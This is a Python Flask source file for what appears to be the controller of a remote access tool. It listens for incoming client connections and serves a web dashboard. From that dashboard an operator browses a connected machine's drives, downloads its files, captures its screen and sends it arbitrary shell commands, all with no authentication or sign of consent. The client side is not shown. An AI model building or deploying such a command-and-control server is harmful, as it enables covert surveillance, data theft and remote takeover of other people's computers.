from flask import Flask, render_template, jsonify, request, send_file
import socket
import threading
import json
from flask_socketio import SocketIO, emit
import ast
import os
import time
import base64
import webbrowser
import platform
from io import BytesIO

app = Flask(__name__)
udp_messages = []
tcp_host = '0.0.0.0'
tcp_port = 8890
file_port = 8891
socketio = SocketIO(app)
clients = {}

sock_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_file.bind(('127.0.0.1', file_port))
sock_file.listen(5)

def recv_all(sock: socket.socket):
    data = b''
    while True:
        chunk = sock.recv(1024)
        if not chunk:
            break
        else:
            data += chunk
    return data

def listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((tcp_host, tcp_port))
    sock.listen(5)
    print(f"TCP listener started on {tcp_host}:{tcp_port}")

    while True:
        client_conn, addr = sock.accept()
        print(f"New connection from {addr}")
        clients[addr] = client_conn
        threading.Thread(target=handle_client, args=(client_conn, addr), daemon=True).start()
        # Notify frontend about new client
        print(f'addr: {addr}')
        ip, port = addr
        socketio.emit('new_client', {'address': ip + ':' + str(port)})

def handle_client(client_conn, addr):
    error_count = 0
    while True:
        try:
            data = client_conn.recv(1024)  # Buffer size is 1024 bytes
            if not data:
                continue
            data = json.loads(data)
            if data["request"] == "connect":
                print(f"{addr} connecting")
                clients[addr] = client_conn
                print(f'connected! current dict:{clients}')
            else:
                udp_messages.append((addr, data["option"]))
        except Exception as e:
            print(f"Error handling client {addr}: {e}")
            error_count = error_count + 1
            if error_count >= 5:
                break
            
            
    client_conn.close()
    del clients[addr]
    # Notify frontend about disconnected client
    socketio.emit('client_disconnected', {'address': str(addr)})

@app.route('/')
def index():
    print(f'current clients: {clients}')
    return render_template('index.html', messages=udp_messages, clients=list(clients.keys()))

@app.route('/messages')
def messages():
    return jsonify(udp_messages)


def get_drives_windows():
    """Get all drives on Windows."""
    import string
    drives = []
    for drive in string.ascii_uppercase:
        if os.path.exists(f"{drive}:\\"):
            drives.append({
                "name": f"{drive}:\\",
                "path": f"{drive}:\\",
                "type": "directory"
            })
    return drives

@app.route('/get_directory', methods=['GET'])
def get_directory():
    path = request.args.get('path', '/')
    addr = request.args.get('addr', '')
    request_val = 'fetch' + path
    addr = addr.split(':')
    ip = addr[0]
    port = addr[1]
    addr = (ip, int(port))
    if addr in clients:
        client_conn = clients[addr]
        client_conn.sendall(b'fetch' + path.encode())
        pathdata_conn, _ = sock_file.accept()
        directory_data = recv_all(pathdata_conn)
    print(f'data from client {directory_data}')
    result = directory_data.decode()
    result = json.loads(result)
    return jsonify(result)

@app.route('/download', methods=['GET'])
def download():
    path = request.args.get('path', '/')
    addr = request.args.get('addr', '')
    request_val = 'fetch' + path
    addr = addr.split(':')
    ip = addr[0]
    port = addr[1]
    addr = (ip, int(port))
    if addr in clients:
        client_conn = clients[addr]
        client_conn.sendall(b'download' + path.encode())
        file_conn, _ = sock_file.accept()
        file_data = recv_all(file_conn)
        print('got file')
        file_obj = BytesIO(file_data)
        return send_file(file_obj, as_attachment=True, download_name=path.split('/')[-1])

    
    

@app.route('/remote_control', methods=["POST"])
def remote_control():
    print(f'current clients:{clients}')
    data = request.get_json()
    print(data)
    if data['data']['type'] == 'screenshot':
        addr_str = data['addr']
        addr_parts = addr_str.split(':')
        if len(addr_parts) != 2:
            return jsonify({"status": "error", "message": "Invalid address format"})
        #print(f'original:{addr_parts}')
        #addr_parts, _ = addr_parts
        #print(type(addr_parts))
        #print(f'after: {addr_parts}')
        #addr_parts = ast.literal_eval(addr_parts)
        #print(111)
        print(addr_parts)
        #ip, port = addr_parts
        ip = addr_parts[0]
        port = addr_parts[1]
        addr = (ip, int(port))
        if addr in clients:
            print("sending command")
            client_conn = clients[addr]
            client_conn.sendall(b'screenshot')
            screenshot_data_conn, _ = sock_file.accept()
            screenshot_data = recv_all(screenshot_data_conn)
            print(f'screenshot size received:{len(screenshot_data)}')
            screenshot_base64 = base64.b64encode(screenshot_data).decode('utf-8')
            return jsonify({"status": "success", "image": f"data:image/jpeg;base64,{screenshot_base64}"})
        else:
            return jsonify({"status": "error", "message": "Client not found"})

    elif data['data']['type'] == 'command':
        addr_str = data['addr']
        addr_parts = addr_str.split(':')
        if len(addr_parts) != 2:
            return jsonify({"status": "error", "message": "Invalid address format"})
        print(f'original:{addr_parts}')
        ip = addr_parts[0]
        port = addr_parts[1]
        addr = (ip, int(port))
        if addr in clients:
            print("sending command")
            client_conn = clients[addr]
            client_conn.sendall(('command' + data['data']['value']).encode())
            result_sock, _ = sock_file.accept()
            result = result_sock.recv(4096)
            print(f'command result size: {len(result)}')
            print(f'result: {result}')
            print(f'command execution result: {result}')
            result_sock.close()
            return jsonify({"status": "success", "text": result.decode()})
        else:
            return jsonify({"status": "error", "message": "Client not found"})
    
    #elif data['data']['type'] == 'download':
        

    else:
        return jsonify({"status": "error", "message": "Invalid command"})

if __name__ == '__main__':
    threading.Thread(target=listener, daemon=True).start()
    
    webbrowser.open('127.0.0.1:8989')
    socketio.run(app, host='0.0.0.0', port=8989)




